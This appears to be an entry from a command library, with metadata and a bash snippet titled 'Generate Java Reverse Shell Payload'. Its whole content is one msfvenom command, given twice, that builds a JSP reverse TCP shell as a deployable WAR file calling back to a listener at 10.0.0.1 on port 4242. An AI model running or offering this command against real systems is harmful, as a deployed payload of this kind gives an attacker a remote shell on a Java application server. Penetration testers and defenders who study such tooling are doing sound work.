---
id: 8c9bc76e-93cb-41e3-b34a-50215452a464
name: Generate Java Reverse Shell Payload
type: command
executor: bash
data: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
output: null
created_at: '2023-04-06T03:56:24.622809+00:00'
updated_at: '2023-04-10T20:25:27.396541+00:00'
---

# Generate Java Reverse Shell Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
```
